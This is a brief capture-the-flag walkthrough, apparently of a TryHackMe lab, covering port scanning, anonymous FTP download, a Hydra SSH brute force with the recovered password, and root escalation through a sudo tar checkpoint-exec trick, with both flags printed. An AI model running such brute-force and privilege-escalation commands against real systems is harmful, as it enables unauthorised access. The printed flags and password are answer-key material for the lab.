# Nmap

Open ports: 
21/ftp (Anonymous)
22/ssh
80 http

Let's try FTP as Anonymous!

```
ftp $IP
get task.txt
get locks.txt
```
So, author is `lin`

# Bruteforce

We can use Hydra to bruteforce `ssh`

```
hydra -l lin -P locks.txt ssh://$IP
```
found password `RedDr4gonSynd1cat3`

```
ssh lin@$IP
```

```
cat user.txt
```
flag is `THM{CR1M3_SyNd1C4T3}`

# Getting Root

Check wat we can do:
```
sudo -l
```
So, we cat use tar as without permissons

https://gtfobins.github.io/gtfobins/tar/

Get reverse shell: 
```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
cat /root/root.txt
```

Flag is `THM{80UN7Y_h4cK3r}`
